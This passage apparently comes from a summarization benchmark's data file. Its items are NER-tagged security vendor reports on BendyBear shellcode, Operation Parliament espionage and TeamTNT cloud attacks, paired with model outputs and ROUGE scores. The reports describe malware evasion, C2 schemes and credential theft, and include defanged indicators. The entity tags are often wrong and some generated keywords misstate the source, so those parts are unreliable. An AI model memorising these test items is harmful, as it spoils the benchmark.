TypeImplant TypeModified RC4Additional Encryption16 - [ORG] Byte [ORG] XOR keysWaterBear [PERSON] BendyBearEXE / DLLShellcodeStage-2Stage-0UNKNOWN Extra XOR ComputationsAuthenticated C2 CommunicationsSignature Verification Magic Bytes1F [CARDINAL] 40 1F 431F [CARDINAL] 40 [CARDINAL] 1F [CARDINAL] 43Chunked [ORG] PayloadsPolymorphic CodeIn - Memory LoadingPEB Debugger [PERSON] CheckPattern [PERSON] EliminationEncrypt / Decrypt Function RoutinesAPI Hooking13/19Process HidingNetwork Traffic FilteringTable 2 . [ORG] Comparison [ORG] of [ORG] BendyBear and WaterBear . File Type \u2013 WaterBear is a standalone [ORG] PE / EXE . BendyBear is a x64 [PERSON] Shellcode that requires loader or code injection . Implant Type \u2013 WaterBear is a stage-2 implant with many capabilities ; [GPE] BendyBear is a stage-0 downloader . Modified RC4 Encryption \u2013 Both [ORDINAL] WaterBear and [ORG] BendyBear use a modified RC4 , but implement them slightly differently . [ORG] WaterBear uses a [CARDINAL] 256 RC4 state box with byte shifting and addition within the key scheduling algorithm . BendyBear uses a [CARDINAL] 258 RC4 state box and performs [PERSON] XOR within the key scheduling algorithm . [ORG] Additional [ORG] Encryption [ORG] \u2013 While both use encryption as a way to conceal artifacts , [GPE] BendyBear was found to contain additional [WORK_OF_ART] XOR encryption steps.16 - Byte XOR Key \u2013 Both use the same [QUANTITY] 16 - byte [ORG] XOR key to create the pre - session key : 0x6162636465666768696A6B6C6D6E6f00Authenticated C2 Communications \u2013 Both send an initial [QUANTITY] 10 - byte challenge request followed by [QUANTITY] 32 - byte session keys . Signature Verification Magic Bytes \u2013 Both use the same matching magic byte verification values . [PERSON] Chunked [PERSON] Payload \u2013 Both expect the payloads to be sent in encrypted chunks . Polymorphic Code \u2013 Both employ code manipulation during runtime execution with random bytes . In - Memory Loading \u2013 Both support the in - memory loading of payloads . PEB Debugger Check \u2013 Both check to see if the code is being debugged . [ORG] Pattern [ORG] Elimination \u2013 Both re - encrypt any decrypted strings upon use . Encrypt / Decrypt [ORG] Function [ORG] Routines \u2013 Both [ORDINAL] WaterBear and [GPE] BendyBear obfuscate runtime function addresses . API Hooking \u2013 Variants of [ORDINAL] WaterBear implement API hooking , while BendyBear does not . Process Hiding \u2013 Variants of WaterBear can hide processes via API hooking , while BendyBear does not support this capability.14/19Network Traffic Filtering \u2013 Variants of WaterBear can filter or hide network traffic via API hooking , while BendyBear does not support this capability . [ORG] ConclusionThe [ORG] BendyBear shellcode contains advanced features that are not typically found in shellcode . The use of anti - analysis techniques and signature block verification indicate that the developers care about stealth and detection - evasion . Additionally , the use of custom cryptographic routines and byte manipulations suggest a high level of technical sophistication . [ORG] Palo [ORG] Alto [ORG] Networks customers can be protected from the attacks outlined in this blog in the following ways : The [CARDINAL] C2 domain used in this shellcode has been categorized as malware in [ORG] DNS [ORG] Security , URL Filtering and [ORG] WildFire , which are security subscriptions for Next- [ORG] Generation [ORG] Firewall customers . [ORG] Cortex [ORG] XDR can identify and block the shellcode during execution . App - ID , the traffic classification system in Next - [ORG] Generation [ORG] Firewalls , is capable of identifying applications irrespective of port , protocol , encryption ( [ORG] SSH or [ORG] SSL ) or any other evasive tactic used by the application . This shellcode attempts to communicate over [ORG] TCP port [CARDINAL] 443 with traffic that does not conform to proper [ORG] SSL or any other known application . As a matter of best practice , we advise customers to block unknown outbound [ORG] TCP traffic in their security policies . Indicators of CompromiseShellcode Samplesx64 \u2013 ( version [CARDINAL] 0.24 ) wg1.inkeslive[.]comx86 \u2013 ( version [CARDINAL] 0.1 ) web2008.rutentw[.]comx86 [ORG] WaterBear [ORG] LoadersThe following executables have been identified as loaders / injectors that contain older WaterBear x86 shellcode . The shellcode code is identical to the x86 sample iThome News \u2013 [ORG] The [ORG] Bureau [ORG] of [ORG] Investigation \u2019s recent investigation of several cases of [ORG] Taiwan [ORG] Government agencies hacked . TeamT5 \u2013 Evil Hidden in [PERSON] Shellcode : [WORK_OF_ART] The [WORK_OF_ART] Evolution [WORK_OF_ART] of [WORK_OF_ART] malware [ORG] DbgPrint . [ORG] TrendMicro \u2013 [WORK_OF_ART] WaterBear [WORK_OF_ART] Returns , Uses API Hooking to Evade Security . [ORG] TrendMicro \u2013 The Trail of [ORG] BlackTech \u2019s [WORK_OF_ART] Cyber [WORK_OF_ART] Espionage [WORK_OF_ART] Campaigns . [ORG] CryCraft [ORG] Technology [ORG] Corp \u2013 [ORG] Taiwan [ORG] Government [ORG] Targeted by [PERSON] Multiple [PERSON] Cyberattacks in [DATE] April [DATE] 2020 Part [CARDINAL] 1 : Waterbear Malware JPCERT / [ORG] CC [ORG] Eyes [ORG] \u2013 [ORG] ELF_PLEAD [ORG] \u2013 [ORG] Linux [ORG] Malware Used by [PERSON] BlackTechAppendixShellcode [PERSON] Proof of [ORG] ConceptMock C2 server serving request to stager and sending a payload ( [ORG] DLL ) that displays a message box : python.exe U42ETHOS_C2.py -l [CARDINAL] 8080 -p [GPE] c:\\temp\\DLLSample.dll stager . It is configured to listen on [ORG] TCP port [CARDINAL] 8080 , and the payload is a test [ORG] DLL that launches calc.exe and displays a message box ( Hello , Implant ) . Figure [CARDINAL] 10 is a Windows 10 host running the shellcode in memory via a custom loader . The shellcode was configured to communicate with the mock C2 server . [ORG] Network [ORG] Traffic for [ORG] the [ORG] Above [ORG] Payload ( truncated):17/19Figure [CARDINAL] 11 . Network traffic capture example.18/1919/19", "generated_text": "PDF; the file; x64; a stage-zero implant; the malware; the WaterBear; ties; BlackTech; the shellcode; the C2 server; the implant; file transfer; screen capture; a command shell; persistence; the C2 server; the malware; properties; the payload; encryption; detection; the environment; detection; code signatures; polymorphic code; scripts; date; the network; information; The victim; Chinese; the group; attacks; East Asia.", "ref_text": "<START-1>The document provides a technical analysis of a novel piece of Chinese malware named \"BendyBear\" by Palo Alto Networks researchers. BendyBear is a sophisticated shellcode module used as a downloader for cyber espionage operations by the threat actor group BlackTech, which has ties to China. The over 10,000 bytes of shellcode implements anti-analysis techniques and advanced encryption to remain stealthy. It shares many similarities with the WaterBear malware linked to BlackTech. The shellcode's goal is to download a second stage implant from a command and control server. The analysis provides details on how the shellcode executes, decrypts configurations, communicates with the C2 server using a custom encryption scheme, and loads the second stage payload directly in memory. Multiple anti-analysis features are highlighted such as clearing DNS caches, PEB modifications, polymorphic code, and debugger checks. Comparisons are drawn between BendyBear and WaterBear in terms of encryption, payload delivery, signature checks, and evasion capabilities. Indicators of compromise are included for the shellcode samples, C2 domains, and WaterBear loaders identified. The shellcode demonstrates sophisticated coding and attempts to evade detection through its implementation. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5681818181818181, "gpt3/lexical/rouge_rouge2": 0.18285714285714286, "gpt3/lexical/rouge_rougeL": 0.2670454545454546, "gpt3/lexical/rouge_rougeLsum": 0.2670454545454546, "gpt3_generated_text": ["Unit 42 researchers have discovered a novel Chinese shellcode named BendyBear, which is linked with the cyber espionage group BlackTech. This highly sophisticated x64 shellcode, over 10,000 bytes in size, is associated with the WaterBear malware family and is used as a stage-zero implant to download a more robust implant from a command and control (C2) server. BendyBear employs advanced features such as modified RC4 encryption, signature block verification, and polymorphic code to evade detection and analysis. It utilizes unique techniques to remain hidden, including transmitting payloads in encrypted chunks, checking for signs of debugging, and clearing the host's DNS cache. This shellcode connects to the C2 server over a common port (443) to blend in with normal SSL network traffic and employs polymorphic code to change its runtime footprint and evade memory analysis. BendyBear is believed to be associated with recent attacks against East Asian government organizations and is a sophisticated and well-engineered sample of shellcode used by an Advanced Persistent Threat (APT)."]}, {"split_name": "test", "sample_id": "test_35", "prompt_text": "Extract the keywords: T HREAT SCAT EGORIEST AGSENCYCLOPEDIAST AT IST ICS DESCRIPT IONSEnglishAPT REPORT SOperation Parliament , who [ORG] Operation [ORG] Parliament , who is doing what ? is doing what?By [PERSON] GReAT on [DATE] April 12 , [DATE] 2018 . [CARDINAL] 7:00 amSummary SummaryKaspersky Security Bulletin : Review of the Year 2017Kaspersky Security Bulletin : Threat Predictions for 2018Threat Predictions for Industrial Security in [CARDINAL] 2018Kaspersky Security Bulletin [DATE] 2016 . Review of the year . Overall statistics for [PRODUCT] 2016Kaspersky [PRODUCT] Security [PRODUCT] Bulletin . Predictions for 2017Kaspersky Security Bulletin [DATE] 2015 . Evolution of cyber threats in the corporate sectorKaspersky Lab has been tracking a series of attacks utilizing unknown malware since [DATE] early [DATE] 2017 . T he attacks appear to be geopolitically motivated and target high profile organizations . T he objective of the attacks is clearly espionage \u2013 they involve gaining access to top legislative , executive and judicial bodies around the world.1 . T he attackers have targeted a large number of organizations globally since [DATE] early [DATE] 2017 , with themain focus on [LOC] the [LOC] Middle [LOC] East and [GPE] North [GPE] Africa ( MENA ) , especially [GPE] Palestine . High - profile organizations have also been targeted in other regions . T he number of attacks has decreased since the beginning of [CARDINAL] 2018.2 . T he attacks were initially discovered while investigating a phishing attack that targeted political figures in the MENA region . At [ORDINAL] first the attacks looked to be the work of the low - sophistication [PERSON] Gaza [PERSON] Cybergang ( decoys , file names ) , but further analysis painted a very different picture.3 . T argets include high - profile entities such as parliaments , senates , top state offices and officials , political science scholars , military and intelligence agencies , ministries , media outlets , research centers , election commissions , Olympic organizations , large trading companies , and other unknown entities.4 . T he malware basically provides a remote [ORG] CMD / PowerShell terminal for the attackers , enablingthem to execute any scripts / commands and receive the result via [ORG] HT [ORG] T [ORG] P requests.5 . [PERSON] Kaspersky [PERSON] Lab users and T hreat Management and [ORG] Defense clients are protected from the attacks . Save web pages as [ORG] PDF with PDFmyURLCisco T alos recently published a blogpost describing targeted attacks in [LOC] the [LOC] Middle [LOC] East region which we believe may be connected . [ORG] Victimology [ORG] and [ORG] Statistics [ORG] Victimology and [ORG] StatisticsBased on our findings , we believe the attackers represent a previously unknown geopolitically motivated threat actor . T he campaign started in [DATE] 2017 , with the attackers doing just enough to achieve their goals . T hey most likely have access to additional tools when needed and appear to have access to an elaborate database of contacts in sensitive organizations and personnel worldwide , especially of vulnerable and non - trained staff . T he victim systems range from personal desktop or laptop systems to large servers with domain controller roles or similar . T he nature of the targeted ministries varied , including those responsible for telecommunications , health , energy , justice , finance and so on . [NORP] Victims have been spotted in the [NORP] Palestinian T erritories , [GPE] Egypt , [GPE] Jordan , the [GPE] UAE , [GPE] Saudi [GPE] Arabia , [GPE] Djibouti , [GPE] Qatar , [GPE] Lebanon , [GPE] Chile , [GPE] Somalia , [GPE] Iraq , [GPE] Morocco , [GPE] Syria , [GPE] India , [GPE] Iran , [GPE] Canada , the [GPE] USA , the [GPE] UK , [GPE] Germany , [GPE] Israel , [GPE] Afghanistan , [GPE] Serbia , [GPE] Russia , [GPE] Oman , [GPE] Kuwait , [GPE] South [GPE] Korea and [GPE] Denmark . [PERSON] Vict i m o r ganiz at io n t ype [PERSON] Vict i m o r ganiz at io n t ypeUnknownSenates / ParliamentsPrime [LAW] Ministerial OfficesMilitary / Intelligence AgenciesOther Gov./Ministerial / DiplomaticOfficesFinancial / Banking [ORG] InstitutionsMedia OutletsOlympic / Sports [ORG] BodiesResearch Centers / ScholarsElection [ORG] CommissionsNum be r o f vict i m [PERSON] Num be r o f vict imo r ganiz at io ns o r ganiz at io ns917352052221Save web pages as [ORG] PDF with PDFmyURLDistribution / Logistics1 T he number of victims / victim organizations probably does n\u2019t represent the full scope of the attacks \u2013 only a portion . Attack description and attribution Attack description and attributionOperation [ORG] Parliament appears to be another symptom of escalating tensions in [LOC] the [LOC] Middle [LOC] East region . T he attackers have taken great care to stay under the radar , imitating another attack group in the region . T hey have been particularly careful to verify victim devices before proceeding with the infection , safeguarding their command and control servers . T he targeting seems to have slowed down since [DATE] the [DATE] beginning [DATE] of [DATE] 2018 , probably winding down when the desired data or access wasSave web pages as [ORG] PDF with [ORG] PDFmyURLobtained . T he targeting of specific victims is unlike previously seen behavior in regional campaigns by [PERSON] Gaza [PERSON] Cybergang or [PERSON] Desert [PERSON] Falcons and points to an elaborate information - gathering exercise that was carried out before the attacks ( physical and/or digital).With deception and false flags increasingly being employed by threat actors , attribution is a hard and complicated task that requires solid evidence , especially in complex regions such as [LOC] the [LOC] Middle [LOC] East . See the following for more information and examples of false flags being used in cyberattacks : Wave your false flags ! \u2026 or [ORG] the [ORG] Nightmares [ORG] and [ORG] Nuances [ORG] of [ORG] a Self - Aware [ORG] Attribution [ORG] SpaceOlympicDestroyer is here to trick the industryMalware description [ORG] Malware descriptionT he malware was [ORDINAL] first seen packed with [ORG] VMProtect ; when unpacked the sample did n\u2019t show any similarities with previously known malware . All the strings and settings were encrypted and obfuscated . Functionality was identified that enables HT T P communication with the [ORG] C&C server and invokes \u201c processcreate \u201d based on parameters received as a response . T he configuration and strings are encrypted using 3DES and [PERSON] Base64 encoding . Data sent to the [ORG] C&C server is also encrypted using 3DES and [PERSON] Base64 . Different keys are used for local and network encryption . T he malware starts communicating with the [ORG] C&C server by sending basic information about the infected machine . T he [ORG] C&C server then replies with the encrypted serialized configuration . T he malware basically provides a remote [ORG] CMD / PowerShell terminal for the attackers , enabling them to execute scripts / commands and receive the results via [ORG] HT [ORG] T [ORG] P requests . Save web pages as [ORG] PDF with PDFmyURLSample of the [ORG] C&C response with encrypted commands and configurations [GPE] Sample of the [ORG] C&C response with encrypted commands and configurationsExamples of attack decoys Examples of attack decoysTranslation : Contacts list of media personnel Translation : Contacts list of media personnelSave web pages as [ORG] PDF with PDFmyURLTranslation : Relations between [GPE] UAE and [GPE] Jordan , and the impact caused by the non - boycott Translation : Relations between [GPE] UAE and [GPE] Jordan , and the impact caused by the non - boycottof [GPE] Qatar of [ORG] QatarSave web pages as [ORG] PDF with PDFmyURLTranslation : Military retirement statement [DATE] 2017 [DATE] June [DATE] Translation : Military retirement statement [CARDINAL] 2017 [ORG] JuneSave web pages as [ORG] PDF with PDFmyURLTranslation : The new [ORG] Hamas structure for [GPE] Gaza strip [DATE] 2017 Translation : The new [ORG] Hamas structure for [GPE] Gaza strip [CARDINAL] 2017Save web pages as [ORG] PDF with PDFmyURLTranslation : Clarification report ( on [GPE] Gaza employee salaries ) Translation : Clarification report ( on [GPE] Gaza employee salaries)What should high - pro\ufb01le organizations What should high - pro\ufb01le organizations do?do?High - profile organizations should have elevated levels of cybersecurity . Attacks against them are inevitable and are unlikely to ever cease . T hese organizations need to pay particular attention to their security , implementing additional measures to ensure they are well protected . Anti - targeted attack solutions , threat intelligence capabilities and data flows , default - deny application lockdown , endpoint detection and response , data leak and insider threat prevention , and even isolated / air - gapped networks should form the basis of any strategy for protecting organizations in the current threat landscape . Save web pages as [ORG] PDF with PDFmyURLT he victims of [ORG] Operation [ORG] Parliament need to re - evaluate their approach to cybersecurity . Additional information Additional informationFor more information about the attacks and the indicators of compromise , please contact : intelreports@kaspersky.comAlternatively , please visit : url o find more information about cybersecurity awareness training for enterprise or government staff , go to [ORG] Kaspersky [ORG] Security [ORG] Awareness . [ORG] APT [ORG] CYBER [ORG] ESPIONAGE [ORG] T [ORG] ARGET [ORG] ED [ORG] AT T ACKShare post on:\uf09a \uf0d5 \uf099Related Posts Related PostsAPT Trends report [CARDINAL] Q1 [CARDINAL] 2018Your new friend , [ORG] KLaraMasha and these [ORG] BearsLEAVE [ORG] A [ORG] REPLY [ORG] LEAVE [ORG] A [ORG] REPLY Your e mail addre ss will not be publishe d. Re quire d fie lds are marke d * Save web pages as [ORG] PDF with PDFmyURLEnte r your comme nt he reName * Email * Notify me whe n ne w comme nts are adde d. SUBMITSave web pages as [ORG] PDF with [ORG] PDFmyURLreCAPTCHAPlease upgrade to a supported browser to get a reCAPTCHA challenge . Alternatively if you think you are getting this page in error , please check your internet connection and reload . Why is this happening to me ? \u00a9 [DATE] 2018 [PERSON] AO [PERSON] Kaspe rsky Lab . All Rights Re se rve d. Re giste re d trade marks and se rvice marks are the prope rty of the ir re spe ctive owne rs . EmailSUBSCRIBEContact us | Privacy Policy | Lice nse Agre e me ntSave web pages as [ORG] PDF with PDFmyURL", "generated_text": "attacks; first; 2017; the Middle East; North Africa; Ministry; media outlets; campaigns; phishing emails; Ghazala Cybergang; targeted organizations; the attackers; a remote CMD/PowerShell terminal; scripts; commands; HT P requests; the attackers; access; a database; contacts; sensitive companies; infrastructure; targets; the Middle East; the group; infrastructure.", "ref_text": "<START-1>Kaspersky Lab has been tracking a series of cyberespionage attacks targeting high-profile organizations around the world since early 2017. The attacks appear to be geopolitically motivated. The main targets are government entities in the Middle East and North Africa, especially Palestine, including parliaments, senates, top state offices, military agencies, ministries, and more. Other regions have also been hit. The attackers use spearphishing to distribute malware that provides a remote command shell for stealing data. Decoy documents are tailored to the targets. Over 100 victims have been identified across the Palestinian Territories, Egypt, Jordan, UAE, Saudi Arabia, and many other countries including the US, UK, Russia, and more. Attribution is difficult due to the use of false flags, but the targeting points to a sophisticated threat actor with access to an elaborate database of high-value targets worldwide. The malware payload uses encryption and obfuscation to hide its C&C communications. It can execute scripts and commands received from the C&C server. The report advises high-profile targets to implement elevated cybersecurity measures like threat intelligence, endpoint detection and response, and air-gapped networks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5388601036269431, "gpt3/lexical/rouge_rouge2": 0.22916666666666666, "gpt3/lexical/rouge_rougeL": 0.28497409326424866, "gpt3/lexical/rouge_rougeLsum": 0.28497409326424866, "gpt3_generated_text": ["This article discusses a series of attacks that have been occurring since early 2017, targeting high profile organizations in the Middle East and North Africa, particularly Palestine. The attacks are believed to be geopolitically motivated and aimed at gaining access to top legislative, executive, and judicial bodies worldwide. The attackers initially appeared to be the low-sophistication Gaza Cybergang, but further analysis revealed a different picture. The targets include parliaments, senates, state offices, political figures, military and intelligence agencies, media outlets, election commissions, and more. The malware used in the attacks provides a remote CMD/PowerShell terminal for the attackers to execute scripts and commands. The campaign is believed to be the work of a previously unknown threat actor with access to additional tools and an extensive database of contacts in sensitive organizations. The victims range from personal systems to large servers with domain controller roles. The attacks have been identified in various countries, including Palestine, Egypt, Jordan, UAE, Saudi Arabia, and others. The article mentions that the number of victims may not represent the full scope of the attacks. The attackers have taken precautions to mimic another attack group and have slowed down their targeting since the beginning of 2018."]}, {"split_name": "test", "sample_id": "test_36", "prompt_text": "Extract the keywords: Tracking the Activities of TeamTNTA Closer Look at a Cloud - FocusedMalicious Actor [PERSON] GroupDavid [PERSON] Fiser and [LOC] Alfredo [LOC] OliveiraContents4 [LOC] Campaigns [LOC] and Targets [CARDINAL] 14 Credential Theft Techniques Notable Payload Functionalities [CARDINAL] 25 [ORG] IRC Bot Evolution 28 Impact of Cryptocurrency Mining Trend Micro ResearchWritten by [PERSON] David [PERSON] Fiser [PERSON] Alfredo [PERSON] OliveiraStock image used under license from Shutterstock.comIn [DATE] 2019 , we set up a container honeypot , a device with an exposed daemon , and almost immediately started to observe a massive cryptocurrency miner deployment across the Linux threat landscape . We later extended our honeypot base on a misconfigured deployment of [ORG] Redis , a popular open - source in - memory data structure store designed for deployment only in secure environments . This confirmed our observations on the cryptocurrency mining trend , which we decided to further investigate . In [DATE] 2020 , we noticed that the deployment scripts became more advanced1 and more aggressive to other malicious actors.2 The payloads were created by a malicious actor group called TeamTNT.Based on its activities , TeamTNT \u2019s main motivation for its campaigns is money , which it tries to obtain by targeting Linux environments , including organizations \u2019 cloud infrastructures . We have previously written about TeamTNT and noted the evolution of its activities . In this paper , we aim to summarize our findings on the group by taking a closer look at its activities in [DATE] 2020 and early 2021.BackgroundThe [ORDINAL] first possible mention of TeamTNT was in [DATE] 2011 , when a website called gold.de was hacked by a groupusing the signature \u201c HildeGard@TeamTNT\u201d.3 This is similar to the signatures we saw in some maliciousshell scripts and [ORG] ELF ( Executable and Linkable [PERSON] Format ) files , which contained the words \u201c TeamTNT \u201d and\u201cHildeGard\u201d . Figure [CARDINAL] 1 . TeamTNT \u2019s signaturesWe believe that at least some members of the group are actors who are native [NORP] German speakers as theirscripts and text , including posts on social media , are written in fluent [NORP] German . Figure [CARDINAL] 2 . Examples of TeamTNT \u2019s usage of [NORP] German on social media and in shell scripts . The shell scripttext shows a tongue - in - cheek comment from a TeamTNT developer complaining that he wouldhave to take his wife to [GPE] Japan for a vacation.4 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [ORG] GroupThe precise number of people behind a hacking group is always difficult to estimate . Such a numbertherefore has to be considered with an error margin . However , we believe that the number of peoplebehind TeamTNT is at least \u2014 if not exactly \u2014 [CARDINAL] 12 . This estimate is based on [CARDINAL] one of the group \u2019s posts onits [PRODUCT] Twitter account . We also believe that the group is actively hiring new members . Figure [CARDINAL] 3 . A tweet from TeamTNT complaining about managing a group of [CARDINAL] 12 programmersIdentifying the individual members of the team can be an even more difficult challenge . Since we do notwant to make false attributions in our research , we do not speculate on this matter . The actors behind TeamTNT profile themselves either as \u201c honest robbers \u201d who mean no harm or as redteam penetration testers , often teasing security researchers in the process . But as we can see in the latersection on cryptocurrency mining , the group \u2019s seemingly \u201c harmless \u201d activity can actually cause heavyfinancial losses . Figure [CARDINAL] 4 . TeamTNT \u2019s red team profile and researcher teasing5 [ORG] | [ORG] Tracking [ORG] the [ORG] Activities [ORG] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [PERSON] GroupTeamTNT is active on [PRODUCT] Twitter , tending to announce its active campaigns and new malware features onthe social network . The group also uses social media to justify its cause or to complain about securitycompanies and researchers . Figure [CARDINAL] 5 . TeamTNT \u2019s [DATE] Christmas campaign notification on TwitterFigure 6 . A tweet from TeamTNT complaining about security researchers6 [ORG] | [ORG] Tracking [ORG] the [ORG] Activities [ORG] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [PRODUCT] GroupCampaigns and [ORG] TargetsWe followed the activities of TeamTNT and reported on several incidents , beginning with its attack thatinvolved the deployment of cryptocurrency miners and distributed denial - of - service ( DDoS ) botnetsagainst open and misconfigured [ORG] Docker [ORG] Daemon ports.4 In [DATE] 2020 and [DATE] early [DATE] 2021 , we tracked more incidentsinvolving the group , including its use of the DDoS - capable [ORG] IRC ( Internet Relay Chat ) bot TNTbotinger5 [DATE] inDecember [DATE] 2020 and its integration of a malicious shell script for stealing cloud credentials in January2021.6Indeed , TeamTNT launched a number of campaigns in [DATE] 2020 and [DATE] early [DATE] 2021 . Some of them were fairlysimple and straightforward , such as the group \u2019s Covid-19 campaign , which capitalized on pandemic - related topics for its malware nomenclature . Others made full use of the TeamTNT \u2019s repertoire of toolsand techniques . We discuss some of the more notable ones in the succeeding subsections . It should benoted that the campaigns are not displayed in any specific order . Furthermore , some of the characteristicsof the malware used in these campaigns , such as the malware \u2019s wormlike behavior , also make it difficultto determine whether they are still actively being pursued by the group . Campaign nameLanguageCovid-19Black - TCompetitor KillerDual InstallerKinsing KillerMeoowSayHiWeave PersistentEnglish / GermanEnglishEnglishEnglishEnglish / GermanEnglish / GermanEnglishEnglishPWN RedisEnglish / [ORG] GermanGet Some SSHDocker4MacAWS StealerEnglishEnglishEnglishTable [CARDINAL] 1 . TeamTNT campaigns in [DATE] 2020 and early 20217 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupCovid-19Like other malicious actor groups , TeamTNT banked on the theme of Covid-19 . In its case , the group didso specifically in naming its malware and deployment URLs . The group took advantage of related topicsto spread malicious samples , with the [ORDINAL] first seen in [DATE] April [DATE] 2020 and the last in [DATE] May [DATE] 2020 . The campaignwas short - lived , which was unusual given that the pandemic had then just started . It is possible that thegroup was not getting the results it wanted , or that it did not want to linger in an already crowded space . Figure [CARDINAL] 7 . A sample code snippet from TeamTNT \u2019s Covid-19 campaignBlack [PERSON] - TA unique feature of TeamTNT \u2019s Black - T campaign was its function called INFECT_ALL_CONTAINERS , which did exactly what its name implied : Check for running containers and deploy malicious samples inthese containers . Figure [CARDINAL] 8 . A sample code snippet showing the INFECT_ALL_CONTAINERS function8 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [PERSON] GroupAfter deploying malicious samples in the running containers , it also deployed malicious containers \u2014 another unique characteristic of this campaign , and one that generated plenty of awareness within theDevOps community . Figure [CARDINAL] 9 . A forum post regarding TeamTNT \u2019s Black - T campaignKinsing KillerA threat known for targeting container systems , [PERSON] Kinsing7 gained notoriety at [DATE] the [DATE] beginning [DATE] of [DATE] 2020 when ittargeted misconfigured [ORG] Docker [ORG] Daemon API ports.8 Since the target environments were shared and therewas fierce competition for resources , TeamTNT started implementing functions to find and neutralizetraces of Kinsing infections on the victim environments to ensure that its malware was the only onerunning \u2014 a technique it also used against \u201c competitors . \u201d9 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupFigure 10 . A sample code snippet from TeamTNT \u2019s [PERSON] Kinsing [PERSON] Killer campaignDocker4MacIn [DATE] December [DATE] 2020 , we sourced a sample from a campaign we called Docker4Mac because of the uniquestring found in the code , a marker indicating the primary targets : [PERSON] Docker users with macOS machines . Wedetermined that the sample was based on a valid script from an open - source project called [ORG] Weave [ORG] Scope , which maps , monitors , and manages containers and pods . TeamTNT injected malicious instructions intothe file , changing its purpose , luring project users , and infecting container and container orchestrationenvironments.9This campaign aims to steal cloud service provider ( CSP ) credentials and deploy a cryptocurrency minerduring the same routine \u2014 something not seen before as the group \u2019s other campaigns would perform theseactions in different phases of the attack . This was also [CARDINAL] one of the [ORDINAL] first times that container orchestrationtechnologies were targeted , in this case via proxy.10 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupFigure 11 . Code snippets from the [ORDINAL] first sample sourced ( top ) and the last lines of the same sample(bottom ) from TeamTNT \u2019s Docker4Mac campaignAWS StealerMalicious actors typically exploit a security weakness in a target device to be able to execute their codeand ultimately accomplish their goals.10 But with exploits becoming too expensive to purchase and findingnew vulnerabilities becoming more complicated with more secure systems , some malicious actors \u2014 inthis case , TeamTNT actors \u2014 instead look for misconfigurations or improper implementations of settingsas an entry point into their target system.11 [ORG] | [ORG] Tracking [ORG] the [ORG] Activities [ORG] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupToward [DATE] the [DATE] end [DATE] of [DATE] 2020 , TeamTNT started a campaign targeting customer instances running on [ORG] AmazonWeb [ORG] Services ( AWS).11 In this scenario , if TeamTNT was able to compromise and access an instance , the group would be able to access any credentials available via the instance \u2019s metadata service . It isimportant to note that the metadata server can be queried only from inside an instance since the [ORG] IPaddress is a link - local address . As containers and misconfigured services were the previous targets ofTeamTNT , the group coincidentally had its malware running on [CARDINAL] a [CARDINAL] couple [CARDINAL] of [CARDINAL] hundred customer instances . Figure [CARDINAL] 12 . Searching for exploits and misconfigurations in a target systemWhile TeamTNT \u2019s infection routines vary depending on the campaign , a typical attack pattern involves thegroup \u2019s scanner obtaining a list of targets ( for example , [ORG] IP addresses ) , which it then scans for securityweaknesses and misconfigurations , such as unsecured [ORG] Redis instances , vulnerable internet - of - things(IoT ) devices , exposed [PERSON] Docker APIs , leaked credentials , and devices accessible via [PERSON] Secure [PERSON] Shell ( SSH).12 [ORG] | [ORG] Tracking [ORG] the [ORG] Activities [ORG] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupScannerList of targets(e.g . , IP addresses)Scan resultsExploitable securityPayload deliveryweaknessExploitablesecurity weaknessVictimFigure [CARDINAL] 13 . A typical infection chain used by TeamTNTIf TeamTNT finds a security issue from the obtained scan results , the group starts delivering its payloads tovictims . If able to be run on compromised hosts , the group \u2019s typical payloads include credential stealers , local network scanners , reverse / bind shells , cryptocurrency miners , and even [ORG] IRC bots . For an enterprise , the impact of a successful TeamTNT attack could be particularly devastating . In a latersection , we discuss the monetary impact of a cryptocurrency miner payload . But that is just [CARDINAL] one part ofthe story : Beyond what an organization or an individual could lose monetarily , attacks could also disruptwhole systems through resource hijacking , leading to denial of service and other interruptions to theoperation . Perhaps even more concerning for an organization is the theft of cloud credentials , which , depending onthe permissions associated with them , could allow a malicious actor to access and even gain control overparts of the IT infrastructure . From there , the actor could perform a number of malicious activities , suchas shutting down systems , accessing confidential data , creating backdoors to gain permanent access tothe system , and , of course , installing cryptocurrency miners and other malware.13 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupCredential Theft TechniquesOne of TeamTNT \u2019s primary goals with its activities is the theft of an organization \u2019s credentials . This could beparticularly damaging , as the group could use the credentials , depending on the permissions associatedwith them , to gain access to other IT systems in order to infect more machines and deploy additionalcryptocurrency miners . In this section , we describe a few of the techniques the group uses to steal credentials . [ORG] SSH [ORG] Credential TheftA behavior of TeamTNT we have often observed is the theft of local credentials and the creation of localusers while ensuring that the selected user is configured to be reachable over [ORG] SSH . This is done to createa method of returning to the system after the infection . In many cases , the attackers deploy their ownSSH public keys . Figure [CARDINAL] 14 . An example of code used by TeamTNT to search for compromised systems fromwhich the group could steal [ORG] SSH credentialsAWS Credential TheftBeginning in [DATE] the [DATE] last [DATE] quarter [DATE] of [DATE] 2020 , many of the samples we found featured functions designed tosearch an infected system for AWS credentials . Initially , these samples had only bare - bones features , searching for the credentials file under the root user 